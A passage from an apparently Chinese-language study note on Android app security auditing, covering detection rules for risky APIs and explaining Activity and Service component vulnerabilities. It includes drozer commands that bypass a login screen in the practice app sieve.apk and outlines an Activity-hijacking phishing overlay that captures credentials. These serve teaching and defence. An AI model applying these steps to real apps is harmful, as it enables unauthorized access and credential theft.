class="number">512</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPPadding</span><br></pre></td></tr></table></figure><h3 id="数据或程序加载检查">数据或程序加载检查</h3><p>**风险等级：**提醒</p><p>需要进行动态分析</p><ul><li>是否加载公共区域程序，如sdcard、/data/local/tmp/、应用自创建但其他应用有读写权限的目录上</li><li>是否从网络下载，检测方法包括：阅读代码、监听网路请求、见识存储区域文件读写、查看安装包</li><li>升级包是否存在公共区域存储</li></ul><h3 id="BASE64安全检测">BASE64安全检测</h3><p>风险等级：<code>提醒</code></p><p>检测出BASE64字符串，并解密。</p><h3 id="文件全局读写漏洞检测">文件全局读写漏洞检测</h3><p>在使用getDir，getSharedPreferences或openFileOutput时，如果设置了全局的可读权限，攻击者恶意读取文件内容，获取敏感信息。在设置文件属性时如果设置全局可写，攻击者可能会篡改、伪造内容，可能会进行诈骗等行为，造成用户财产损失。其中getSharedPreferences如果设置全局写权限，则当攻击app跟被攻击app具有相同的<code>Android:sharedUserId</code>属性时和签名时，攻击app则可以访问到内部存储文件进行写入操作。</p><p><strong>风险等级</strong>：<code>中危</code></p><p><strong>问题示例：</strong></p><p>检测出使用了getDir、getSharedPreferences和openFileOutput函数的参数值是否使用了<code>MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE</code>。</p><p><strong>建议</strong>：</p><ul><li>使用MODE_PRIVATE模式创建内部存储文件</li><li>加密存储敏感数据</li><li>避免在文件中存储明文敏感信息</li><li>避免滥用”Android:sharedUserId”属性</li></ul><p>如果两个app<code>Android:sharedUserId</code>属性相同，切使用的签名也相同，则这两个app可以互相访问内部存储文件数据。</p><h3 id="日志泄露风险检测">日志泄露风险检测</h3><p>在APP的开发过程中，为了方便调试，通常会使用log函数输出一些关键流程的信息，这些信息中通常会包含敏感内容，如执行流程、明文的用户名密码等，这会让攻击者更加容易的了解APP内部结构方便破解和攻击，甚至直接获取到有价值的敏感信息。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>检测是否调用了Log.v、Log.d、Log.e、Log.i、Log.w、Log.f、Log.s函数</p><p><strong>建议</strong>：</p><p>在生产环境中移除Log打印。</p><h3 id="外部加载dex检测">外部加载dex检测</h3><p>动态加载的dex文件存储在被其他应用任意读写的目录中(如sdcard)，如果没有对外部所加载的dex文件做完整性检验，应用将会被恶意代码注入，从而执行恶意代码</p><p>**风险等级：**高危</p><p><strong>问题示例：</strong></p><p>关键：public DexClassLoader (String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent)</p><p>首先获取所有调用了DexClassLoader函数的路径，然后对每个路径下的代码片段进行检查，判断有没有调用<code>Environment.getExternalStorageDirectory().toString()</code>该方法。两个条件同时满足，则判定该路径下的代码片段有风险。</p><p><strong>建议：</strong></p><ul><li>将所需要动态加载的DEX/APK文件放置在APK内部或应用私有目录中</li><li>使用加密网络协议进行下载加载的DEX/APK文件并将其放置在应用私有目录中</li><li>对不可信的加载来源进行完整性校验</li></ul><h3 id="外部存储路径检测">外部存储路径检测</h3><p>文件存放在external storage，例如sd卡，是全局可读可写的，由于external storage可以被任意用户操作，且可以被所有应用修改使用，所有，app的敏感数据建议不要存放在external storage</p><p>**风险等级：**低危</p><p>动态方法监测<code>/data/data/&lt;packagename&gt;/</code>目录下所有生成的目录是否带有明文信息泄露</p><h3 id="明文数字证书风险">明文数字证书风险</h3><p>Apk中使用的数字证书可被用来校验服务器的合法身份，以及在与服务器进行通信的过程中对传输数据进行加密、解密运算，保证传输数据的保密性、完整性。明文存储的数字证书如果被篡改，客户端可能连接到假冒的服务端上，导致用户名、密码等信息被窃取；如果明文证书被盗取，可能造成传输数据被截获解密，用户信息泄露，或者伪造客户端向服务器发送请求，篡改服务器中的用户数据或造成服务器响应异常。</p><p><strong>风险等级</strong>：<code>中危</code></p><p><strong>问题示例</strong>：</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;assets/location_public_key.der&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets/verisign.cer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;res/raw/servicecert.cer&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><h2 id="敏感函数调用检测">敏感函数调用检测</h2><h3 id="安全相关的函数检测">安全相关的函数检测</h3><p>一些存放敏感的安全配置信息的<strong>函数</strong>，一般函数名都可能带有encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等关键字。</p><p>通过encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等和安全相关的关键字进行匹配查找，然后逐个检测类的安全性。</p><h3 id="安全相关的类检测">安全相关的类检测</h3><p>一些存放敏感的安全配置信息的<strong>文件</strong>，一般文件都可能带有encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等关键字。</p><p>通过encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等和安全相关的关键字进行匹配查找，然后逐个检测类的安全性。</p><h3 id="运行命令检测">运行命令检测</h3><p>检测 命令执行相关的代码</p><p><strong>问题示例：</strong></p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;ls -al&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;ls -al&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><h3 id="Native-Library加载检测">Native Library加载检测</h3><p>检测加载so文件的Native方法。</p><p><strong>风险等级</strong>：<code>提示</code></p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;libtest.so&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/lang/</span>System;-&gt;loadLibrary(Ljava<span class="regexp">/lang/</span>String;)V</span><br></pre></td></tr></table></figure><h3 id="外部动态加载dex检测">外部动态加载dex检测</h3><p>在Android4.1之前的系统版本，允许应用在全局可读可写的位置动态加载dex文件，有文件被替换的风险</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>需要检测代码中的DexClassLoader和Android版本，只有Android版本 &lt; 4.1才会出现该漏洞。</p><p>Java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DexClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(</span><br><span class="line">    optimizedDexOutputPath.getAbsolutePath(),              <span class="comment">//参数1</span></span><br><span class="line">    Environment.getExternalStorageDirectory().toString(),  <span class="comment">//参数2</span></span><br><span class="line">    <span class="literal">null</span>,                                                  <span class="comment">//参数3</span></span><br><span class="line">    getClassLoader());                                     <span class="comment">//参数4</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Ldalvik<span class="symbol">/system/DexClassLoader</span>;<span class="operator">-&gt;</span><span class="symbol">&lt;init&gt;</span>(Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/String</span>;</span><br><span class="line"></span><br><span class="line">Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/ClassLoader</span>;)V</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p><strong>建议</strong></p><ul><li>禁止外部（不安全的源）加载DEX，将所需要动态加载的DEX/APK文件放置到APK内部或应用私有目录中。</li><li>使用加密网络协议进行下载加载的DEX/APK文件并将其放置到应用私有目录中。</li><li>对不可信的加载来源进行完整性校验。</li></ul><h3 id="root代码检测">root代码检测</h3><p>检查app是否有执行检测root环境的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;su&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;su&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure><h3 id="获取IMEI-和Device-ID敏感信息代码检测">获取IMEI 和Device ID敏感信息代码检测</h3><p>检查app是否有执行获取IMEI和Device ID敏感信息的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TelephonyManager tm <span class="operator">=</span> (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE)<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">String DEVICE_ID <span class="operator">=</span> tm.getDeviceId()<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;tm&quot;</span>:<span class="class">Landroid/telephony/TelephonyManager;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Landroid/telephony/TelephonyManager;</span>-&gt;getDeviceId()<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">.local</span> v0, <span class="string">&quot;DEVICE_ID&quot;</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">return-void</span><br></pre></td></tr></table></figure><h3 id="获取Android-ID敏感信息代码检测">获取Android ID敏感信息代码检测</h3><p>检查app是否有执行获取Android ID敏感信息的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> android.provider.Settings.Secure;</span><br><span class="line"><span class="type">String</span> androidId = Secure.<span class="built_in">getString</span>(<span class="built_in">getContentResolver</span>(), Secure.ANDROID_ID);</span><br></pre></td></tr></table></figure><p>Dalvik/ART</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class">Lcom/bug/sensitive/func/MainActivity;</span>-&gt;getContentResolver()<span class="class">Landroid/content/ContentResolver;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v1, <span class="string">&quot;android_id&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;v0, v1&#125;, <span class="class">Landroid/provider/Settings$Secure;</span></span><br><span class="line">-&gt;getString(<span class="class">Landroid/content/ContentResolver;</span><span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br></pre></td></tr></table></figure><h3 id="发送SMS敏感代码检测">发送SMS敏感代码检测</h3><p>检查app是否有调用发送SMS函数。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SmsManager</span> <span class="variable">smsm</span> <span class="operator">=</span> SmsManager.getDefault();</span><br><span class="line">smsm.sendTextMessage(<span class="string">&quot;123123&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;hello&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendDataMessage(<span class="string">&quot;13123&quot;</span>, <span class="string">&quot;123&quot;</span>, (<span class="type">short</span>) <span class="number">90</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line">smsm.sendMultimediaMessage(<span class="built_in">this</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><h3 id="文件删除代码检测">文件删除代码检测</h3><p>检测app是否有调用删除文件的代码</p><p>**风险等级：**提醒</p><p><strong>问题示例</strong></p><p>Java代码</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">File</span> <span class="keyword">file</span> = <span class="keyword">new</span> <span class="keyword">File</span>(<span class="string">&quot;tmp.doc&quot;</span>);</span><br><span class="line"><span class="keyword">boolean</span> deleted = <span class="keyword">file</span>.<span class="keyword">delete</span>();</span><br></pre></td></tr></table></figure><p>上述代码反编译后的Dalvik/ART代码为</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">new-instance v1, <span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">const-string </span>v2, <span class="string">&quot;tmp.doc&quot;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/io/File;</span>-&gt;&lt;init&gt;(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">.line</span> 55</span><br><span class="line"><span class="keyword">.local</span> v1, <span class="string">&quot;file&quot;</span>:<span class="class">Ljava/io/File;</span><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/io/File;</span>-&gt;delete()Z</span><br></pre></td></tr></table></figure><h3 id="signature代码检测">signature代码检测</h3><p>检查app是否有调用获取signature的代码。</p><p><strong>风险等级</strong>：<code>提醒</code></p><p><strong>问题示例</strong>：</p><p>Java代码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PackageManager pkgManager = <span class="built_in">context</span>.getPackageManager();</span><br><span class="line"><span class="keyword">byte[] </span>signature = pkgManager.getPackageInfo(</span><br><span class="line">    <span class="built_in">context</span>.getPackageName(),</span><br><span class="line">    PackageManager.GET_SIGNATURES).signatures[<span class="number">0</span>].toByteArray(); </span><br></pre></td></tr></table></figure><p>上述代码反编译后的Dalvik/ART代码</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">move-result-object v0</span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">iget-object </span>v2, v0, <span class="class">Landroid/content/pm/PackageInfo;</span>-&gt;signatures:[<span class="class">Landroid/content/pm/Signature;</span></span><br></pre></td></tr></table></figure><h2 id="系统漏洞检测">系统漏洞检测</h2><h1>APP一些漏洞原理</h1><h2 id="Activity组件的相关漏洞">Activity组件的相关漏洞</h2><p><strong>(1) Activity漏洞种类</strong></p><ul><li>越权绕过</li><li>钓鱼欺诈/Activity劫持</li><li>隐私启动intent包含敏感信息</li><li>拒绝服务攻击</li></ul><p><strong>(2) Activity安全场景和危害</strong></p><p>Activity的组件导出，一般会导致的问题Android Browser Intent Scheme URLs的攻击手段</p><ul><li>拒绝服务攻击：通过Intent给Activity传输畸形数据使得程序崩溃从而影响用户体验</li><li>越权攻击：Activity用户界面绕过会造成用户信息窃取，Activity界面被劫持产生欺诈等安全事件</li><li>组件导出导致钓鱼欺诈</li><li>隐式启动Intent包含敏感数据</li></ul><h3 id="Activity漏洞原理分析和复现">Activity漏洞原理分析和复现</h3><h4 id="越权绕过"><strong>越权绕过</strong></h4><p><strong>原理分析</strong>：</p><p>在Android系统中，Activity默认是不导出的，如果设置了exported <code>=` `&quot;true&quot;` `这样的关键值或者是添加了&lt;intent</code>-<code>filter</code>&gt;这样的属性，那么此时Activity是导出的，就会导致越权绕过或者是泄露敏感信息等安全风险。</p><p><strong>漏洞复现</strong></p><p>附件：sieve.apk</p><p>使用drozer进行分析</p><p>打开这个demo，发现需要输入账号和密码才能进入下一个Activity，我们才是越权绕过这个<code>密码验证</code>界面。</p><ul><li><p>查找该app包名 <code>run app.package.list</code></p></li><li><p>查询目标应用的攻击面，知道有三个Activity是被导出的<br><code>run app.package.attacksurface com.mwr.example.sieve</code><img src="assets/image-20240921212645899.png" alt="image-20240921212645899"></p></li><li><p>继续查询暴露的Activity信息<br><code>run app.activity.info -a com.mwr.example.sieve</code><img src="assets/image-20240921212828487.png" alt="image-20240921212828487"></p></li><li><p>说明可以进行Activity相互越权</p><p><code>run app.activity.start --component  com.mwr.example.sieve com.mwr.example.sieve.PWList</code></p></li></ul><p><strong>防护策略</strong></p><ul><li>私有Activity不应该被其他应用启动相对是安全的，创建Activity时，设置exported属性为false</li><li>公开暴露的Activity组件，可以被任意应用启动，创建Activity：设置export属性为true，谨慎处理接收的Intent，有返回数据不包含敏感信息，不应发送敏感信息，收到返回数据谨慎处理</li></ul><h4 id="钓鱼欺诈-Activity劫持">钓鱼欺诈/Activity劫持</h4><p><strong>原理介绍</strong></p><p>​         Activity app中不同界面的切换通过activity的调度来实现，而activity的调度是由Activity系统中的AMS来实现的。每个应用想要启动或者停止一个进程，都报告给AMS。AMS收到启动或停止Activity的消息时，先更新内部记录，再通知相应的进程或停止指定的Activity。当新的Activity启动，前一个Activity就会停止，这些Activity会保留在系统中的一个Activity历史栈中。每有一个Activity启动，它就压入历史栈顶，并在手机上显示。当用户按下back，顶部的Activity弹出，恢复前一个Activity，栈顶指向当前的Activity。</p><p>​        由于Activity的这种特性，如果在启动一个activity时，给他加入一个标签FLAG_ACTIVITY_NEW_TASK，就会使他置于栈顶让他立马呈现给用户，如果这个Activity是用于盗号的伪装Activity，就会产生钓鱼安全事件或者一个Activity中有webview加载，允许加载任意网页都有可能产生钓鱼事件。</p><p><strong>实现原理：</strong><br>如果我们注册一个receiver，响应android.intent.action.BOOT_COMPLETED，使得开启启动一个service；这个service，会启动一个计时器，不停枚举当前进程中是否有预设的进程启动，如果发现有预设进程，则使用FLAG_ACTIVITY_NEW_TASK启动自己的钓鱼界面，截获正常应用的登录凭证</p><p><strong>实现步骤：</strong><br>(<code>1</code>)启动一个服务<br>(<code>2</code>)不断扫描当前进程<br>(<code>3</code>)找到目标后弹出伪装窗口</p><p><strong>安全防护</strong></p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">如果真的爆发了这种恶意程序，我们并不能在启动程序时每一次都那么小心去查看判断当前在运行的是哪一个程序，当android:noHistory<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;true&quot;</span><span class="string">``</span>时上面的方法也无效</span><br><span class="line">目前，对activity劫持的防护，只能是适当给用户警示信息。一些简单的防护手段就是显示当前运行的进程提示框。</span><br><span class="line">梆梆加固则是在进程切换的时候给出提示，并使用白名单过滤。</span><br></pre></td></tr></table></figure><h4 id="隐私启动Intent包含敏感数据">隐私启动Intent包含敏感数据</h4><p><strong>原理介绍</strong></p><p>介绍原理之前先熟悉一下Intent的隐式和显式两种</p><ul><li><p>显式方法<br><code>Intent intent = new Intent(MainActivit.this, NewActivity.class)</code></p></li><li><p>隐式方法</p><p>一般用于不同应用程序之间的数据传送</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.wooyun.test&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure></li></ul><p>原理介绍：有一个应用A，采用Intent隐式传递，他的动作是&quot;x&quot;，此时还有一个应用B，动作也是X，我们在启动的时候，通过隐式Intent传递，就会出现两个界面，我们不知道到底启动A还是B</p><p>因为现在这种漏洞在Android版本更新后，基本很少出现了，所以这里就不做复现和安全防护了</p><h4 id="拒绝服务攻击">拒绝服务攻击</h4><p><strong>原理介绍</strong></p><p>​        拒绝服务攻击源于程序没有对Intent.getXXXExtra()获取的异常或者畸形数据处理时没有进行异常捕获，从而导致攻击者向应用程序发送此类空数据，异常或者畸形数据来达到使该应用crash的目的，我们可以通过intent发送空数据，异常或者畸形数据给正常应用，导致其崩溃。本地拒绝服务可以被竞争方利用攻击，使得自己的应用崩溃造成破坏。</p><p>​        危害：拒绝服务漏洞对于锁屏应用、安全防护类软件危害是巨大的</p><p><strong>安全防护</strong></p><h5 id="Android外部程序的调用方法">Android外部程序的调用方法</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//1.使用自定义的Action</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//A程翠中调用代码为：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">intent.setAction(<span class="string">&quot;com.test.action.PLAYER&quot;</span>);              </span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//B程序中的AndroidManifest.xml中启动Activity的intent-filter</span></span><br><span class="line">    &lt;intent-filter&gt;</span><br><span class="line">                  &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">                   &lt;action android:name=<span class="string">&quot;com.test.action.PLAYER&quot;</span> /&gt;</span><br><span class="line">                   &lt;category android:name=<span class="string">&quot;android.intent.category.DEFAULT&quot;</span> /&gt;</span><br><span class="line">                       &lt;!--必须，否则无效--&gt;</span><br><span class="line">                  &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">    &lt;/intent-filter&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2.使用包类名</span></span><br><span class="line">                      </span><br><span class="line"><span class="comment">//A程序中调用的代码：</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intetn</span>();</span><br><span class="line">intent.setClassName(<span class="string">&quot;包名&quot;</span>,<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">startActivity(intent);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.使用ComponentName</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line"><span class="type">ComponentName</span> <span class="variable">comp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ComponentName</span>(<span class="string">&quot;包名&quot;</span>,<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">intent.setComponent(comp);</span><br><span class="line">startActivity();</span><br><span class="line"></span><br><span class="line"><span class="comment">//B程序被调用中AndroidManifest.xml中启动Activity的intent-filter不需要特别加入其它信息，如下即可：</span></span><br><span class="line">      &lt;intent-filter&gt;</span><br><span class="line">          &lt;action android:name=<span class="string">&quot;android.intent.action.MAIN&quot;</span> /&gt;</span><br><span class="line">        &lt;category android:name=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span><br><span class="line">      &lt;/intent-filter&gt;</span><br></pre></td></tr></table></figure><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">安全防护：</span><br><span class="line">  <span class="string">``</span>（<span class="string">``</span><span class="number">1</span><span class="string">``</span>）空指针异常、类型转换异常、数组越界访问异常、类未定义异常、其它异常</span><br><span class="line">  <span class="string">``</span>（<span class="string">``</span><span class="number">2</span><span class="string">``</span>）谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<span class="string">``</span><span class="keyword">try</span><span class="string">``</span>/<span class="string">``</span><span class="keyword">catch</span>处理，以及对不符合预期数据做异常处理</span><br><span class="line">总结：</span><br><span class="line"><span class="number">1.</span><span class="string">``</span>不需要被外部调用的activity设置android:exported<span class="string">``</span>=<span class="string">``</span><span class="string">&quot;false&quot;</span><span class="string">``</span>；</span><br></pre></td></tr></table></figure><p><strong>安全防护</strong>：</p><p>​(1)空指针异常，类型转换异常，数组越界访问异常，类未定义异常，其他异常</p><p>​    (2)谨慎处理接收的intent以及其携带的信息，对接收到的任何数据做<code>try/catch</code>处理，以及对不符合预期数据做异常处理</p><p>总结：</p><p>1.不需要被外部调用的activity设置android:exported<code>=</code>“false”；</p><p>2.若需要外部调用，需自定义signature或者signatureOrSystem级别的权限；</p><p>3.注册的组件请严格校验输入参数，注意空值判定和类型转换判断</p><h2 id="Service组件相关漏洞">Service组件相关漏洞</h2><h3 id="service基本介绍">service基本介绍</h3><p><strong>步骤</strong>：</p><ul><li>​创建一个service服务</li><li>我们重写服务中的三大方法onCreate()，onStartCommand()，onDestory()</li></ul><p><strong>详解</strong></p><ul><li>onCreate()方法会在服务创建的时候调用</li><li>onStartCommand()方法会在每次服务启动的时候调用，通常我们希望服务在开启立刻执行某个动作就会在onStartCommand()里</li><li>onDestroy()会在服务销毁的时候调用</li></ul><h3 id="service启动">service启动</h3><p><img src="assets/image-20240922163909306.png" alt="image-20240922163909306"></p><p><strong>启动方式</strong></p><ul><li>startService：主要用于启动一个服务执行后台任务，不进行通信，而且必须用stopService来结束，不调用会导致activity结束而Service还运行</li><li>bindService：该方法启动的服务还可以进行通信，启动的Service可以有unbindService来结束，也可以在activity结束之后自动结束</li><li>startService 同时也 bindService 启动的服务：停止服务应同时使用stopService和unbindService</li></ul><p><strong>StartService</strong></p><p>我们根据Intent的启动方式，又可以通过显式启动和隐式启动</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">显示启动：</span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>,TestService.class);</span><br><span class="line">startService(intent);</span><br><span 